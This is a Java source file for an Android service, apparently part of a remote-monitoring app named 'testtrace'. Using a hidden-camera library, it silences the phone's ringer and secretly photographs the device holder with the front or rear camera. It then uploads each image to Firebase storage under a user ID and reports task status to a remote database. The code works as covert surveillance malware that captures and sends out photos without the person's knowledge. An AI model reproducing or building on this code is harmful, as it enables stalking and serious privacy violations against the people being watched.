package com.reiserx.testtrace.Service;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.androidhiddencamera.CameraConfig;
import com.androidhiddencamera.CameraError;
import com.androidhiddencamera.HiddenCameraService;
import com.androidhiddencamera.HiddenCameraUtils;
import com.androidhiddencamera.config.CameraFacing;
import com.androidhiddencamera.config.CameraImageFormat;
import com.androidhiddencamera.config.CameraResolution;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.reiserx.testtrace.Classes.ExceptionHandler;
import com.reiserx.testtrace.Models.TaskSuccess;
import com.reiserx.testtrace.Models.downloadUrl;

import java.io.File;
import java.util.Calendar;

public class CameraService extends HiddenCameraService {
    public CameraService() {
    }

    String TAG = "CameraService.logs";

    CameraConfig cameraConfig;

    FirebaseDatabase mdb;
    DatabaseReference reference;

    TaskSuccess taskSuccess;

    String UserID;

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        try {
            int requestCode = intent.getIntExtra("requestCode", 0);

            Log.d(TAG, String.valueOf(requestCode));

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                    == PackageManager.PERMISSION_GRANTED) {

                if (HiddenCameraUtils.canOverDrawOtherApps(this)) {

                    AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                    audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                    if (requestCode == 1) {
                        cameraConfig = new CameraConfig()
                                .getBuilder(this)
                                .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                                .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                                .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                                .build();
                    } else if (requestCode == 2) {
                        cameraConfig = new CameraConfig()
                                .getBuilder(this)
                                .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)
                                .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                                .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                                .build();
                    }

                    startCamera(cameraConfig);

                    SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
                    UserID = save.getString("UserID", "");

                    mdb = FirebaseDatabase.getInstance();
                    reference = mdb.getReference().child("Main").child(UserID).child("CameraCapture");

                    new android.os.Handler().postDelayed(() -> {
                        taskSuccess = new TaskSuccess("Capturing image", true, false);
                        reference.setValue(taskSuccess);
                        takePicture();
                    }, 2000L);
                } else {

                    //Open settings to grant permission for "Draw other apps".
                    HiddenCameraUtils.openDrawOverPermissionSetting(this);
                }
            } else {
                reference.setValue("Camera permission not available");
            }
        } catch (Exception e) {
            ExceptionHandler exceptionHandler = new ExceptionHandler(e, UserID);
            exceptionHandler.upload();
        }
        return START_NOT_STICKY;
    }

    @Override
    public void onImageCapture(@NonNull File imageFile) {
        taskSuccess.setMessage("Image captured");
        taskSuccess.setSuccess(true);
        reference.setValue(taskSuccess);
        uploadImageToServer(imageFile);
        AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
        stopSelf();
    }

    @Override
    public void onCameraError(@CameraError.CameraErrorCodes int errorCode) {
        switch (errorCode) {
            case CameraError.ERROR_CAMERA_OPEN_FAILED:
                //Camera open failed. Probably because another application
                //is using the camera
                taskSuccess.setMessage("Camera open failed, other app is using it now");
                taskSuccess.setSuccess(false);
                taskSuccess.setFinal(true);
                reference.setValue(taskSuccess);
                break;
            case CameraError.ERROR_IMAGE_WRITE_FAILED:
                //Image write failed. Please check if you have provided WRITE_EXTERNAL_STORAGE permission
                taskSuccess.setMessage("Image write failed. Please check if you have provided WRITE_EXTERNAL_STORAGE permission");
                taskSuccess.setSuccess(false);
                taskSuccess.setFinal(true);
                reference.setValue(taskSuccess);
                break;
            case CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE:
                //camera permission is not available
                //Ask for the camera permission before initializing it.
                taskSuccess.setMessage("Don't have camera permission");
                taskSuccess.setSuccess(false);
                taskSuccess.setFinal(true);
                reference.setValue(taskSuccess);
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION:
                //Display information dialog to the user with steps to grant "Draw over other app"
                //permission for the app.
                taskSuccess.setMessage("Don't have DRAW_OVER_OTHER_APPS_PERMISSION");
                taskSuccess.setSuccess(false);
                taskSuccess.setFinal(true);
                reference.setValue(taskSuccess);
                HiddenCameraUtils.openDrawOverPermissionSetting(this);
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA:
                taskSuccess.setMessage("Device don't have front camera");
                taskSuccess.setSuccess(false);
                taskSuccess.setFinal(true);
                reference.setValue(taskSuccess);
                break;
        }
        stopSelf();
    }

    public void uploadImageToServer (File file) {
        StorageReference storageReference = FirebaseStorage.getInstance().getReference().child("Main").child(UserID).child("CameraPicture").child(file.getName());
        DocumentReference documentReference = FirebaseFirestore.getInstance().collection("Main").document(UserID).collection("CameraPicture").document(file.getName());
        storageReference.putFile(Uri.fromFile(file)).addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                Log.d(TAG, "uploaded");
                taskSuccess.setMessage("Uploading to server");
                taskSuccess.setSuccess(true);
                reference.setValue(taskSuccess);
                storageReference.getDownloadUrl().addOnSuccessListener(uri -> {
                    Log.d(TAG, "getting url");
                    Calendar cal = Calendar.getInstance();
                    long currentTime = cal.getTimeInMillis();
                    downloadUrl downloadUrl = new downloadUrl(uri.toString(), currentTime);
                    documentReference.set(downloadUrl).addOnSuccessListener(unused -> {
                        Log.d(TAG, "upload complete");
                        taskSuccess.setMessage("Upload successful");
                        taskSuccess.setSuccess(true);
                        taskSuccess.setFinal(true);
                        reference.setValue(taskSuccess);
                    });
                });
            }
        });
    }
}